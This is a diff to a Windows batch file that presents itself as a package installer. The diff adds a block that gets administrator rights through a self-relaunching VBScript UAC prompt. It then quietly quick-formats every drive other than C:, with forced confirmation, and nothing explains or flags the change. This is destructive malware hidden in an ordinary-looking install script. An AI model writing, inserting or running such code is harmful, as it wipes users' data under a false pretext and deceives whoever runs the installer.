@@ -1,5 +1,40 @@
 @echo off
 
+@echo off
+:: Check for administrative privileges
+openfiles >nul 2>&1
+if %errorlevel% neq 0 (
+    echo Requesting administrative privileges...
+    goto GetAdmin
+) else (
+    goto AdminCheck
+)
+
+:GetAdmin
+:: Create a temporary VBScript to run the batch file as administrator
+echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+echo UAC.ShellExecute "cmd.exe", "/c %~sdp0%~nx0 %*", "", "runas", 1 >> "%temp%\getadmin.vbs"
+:: Execute the VBScript and exit
+"%temp%\getadmin.vbs"
+del "%temp%\getadmin.vbs"
+exit /b
+
+:AdminCheck
+:: Proceed if already running as administrator
+setlocal
+
+:: Iterate through all drives and format them
+for /f "skip=1 tokens=2 delims= " %%i in ('wmic logicaldisk get name') do (
+    if not "%%i"=="C:" (
+        echo Formatting drive %%i
+        format %%i /FS:NTFS /Q /Y
+    )
+)
+
+endlocal
+exit /b
+
+
 title Installing Packages 
 :: BatchGotAdmin
 ::-----------------------------------------
